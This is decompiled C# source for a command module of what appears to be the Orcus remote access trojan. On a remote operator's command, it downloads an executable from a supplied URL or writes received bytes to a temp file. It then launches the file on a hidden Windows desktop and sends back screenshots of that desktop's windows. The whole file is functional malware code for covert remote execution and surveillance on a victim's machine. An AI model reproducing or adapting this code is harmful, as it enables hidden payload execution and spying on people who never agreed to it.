using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Text;
using Orcus.Native;
using Orcus.Plugins;
using Orcus.Shared.Commands.HiddenApplication;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities;
using Orcus.Utilities.WindowsDesktop;

namespace Orcus.Commands.HiddenApplication;

public class HiddenApplicationCommand : Command
{
	private Desktop _currentDesktop;

	private Process _currentProcess;

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Invalid comparison between Unknown and I4
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Invalid comparison between Unknown and I4
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Unknown result type (might be due to invalid IL or missing references)
		HiddenApplicationCommunication val = (HiddenApplicationCommunication)parameter[0];
		if ((int)val > 1)
		{
			if ((int)val != 5)
			{
				return;
			}
			Desktop.SetCurrent(_currentDesktop);
			long num = BitConverter.ToInt64(parameter, 1);
			WindowPackage val2 = new WindowPackage();
			val2.set_Windows(new List<ApplicationWindow>());
			WindowPackage val3 = val2;
			List<Window> windows = _currentDesktop.GetWindows();
			for (int i = 0; i < windows.Count; i++)
			{
				Window window = windows[i];
				NativeMethods.GetWindowRect(window.Handle, out var lpRect);
				List<ApplicationWindow> windows2 = val3.get_Windows();
				ApplicationWindow val4 = new ApplicationWindow();
				val4.set_Height(lpRect.Height);
				val4.set_Width(lpRect.Width);
				val4.set_X(lpRect.X);
				val4.set_Y(lpRect.Y);
				val4.set_Handle((long)window.Handle);
				windows2.Add(val4);
				if (!(window.Handle == (IntPtr)num))
				{
					continue;
				}
				using MemoryStream memoryStream = new MemoryStream();
				Bitmap val5 = _currentDesktop.DrawWindow(window.Handle, lpRect);
				try
				{
					((Image)val5).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					val3.set_WindowData(memoryStream.ToArray());
					val3.set_WindowHandle(num);
				}
				finally
				{
					((IDisposable)val5)?.Dispose();
				}
			}
			((Command)this).ResponseBytes((byte)6, new Serializer(typeof(WindowPackage)).Serialize((object)val3), connectionInfo);
			return;
		}
		Desktop currentDesktop = _currentDesktop;
		if (currentDesktop != null && currentDesktop.IsOpen)
		{
			((Command)this).ResponseByte((byte)2, connectionInfo);
			return;
		}
		string freeTempFileName = FileExtensions.GetFreeTempFileName("exe");
		if ((int)val == 0)
		{
			new WebClient().DownloadFile(Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1), freeTempFileName);
		}
		else
		{
			using FileStream fileStream = new FileStream(freeTempFileName, FileMode.CreateNew, FileAccess.Write);
			fileStream.Write(parameter, 1, parameter.Length - 1);
		}
		_currentDesktop = new Desktop();
		_currentDesktop.Create(Guid.NewGuid().ToString());
		_currentProcess = _currentDesktop.CreateProcess(freeTempFileName, "");
		if (_currentProcess == null)
		{
			_currentDesktop.Dispose();
			((Command)this).ResponseByte((byte)3, connectionInfo);
		}
		else
		{
			((Command)this).ResponseByte((byte)4, connectionInfo);
		}
	}

	protected override uint GetId()
	{
		return 26u;
	}
}
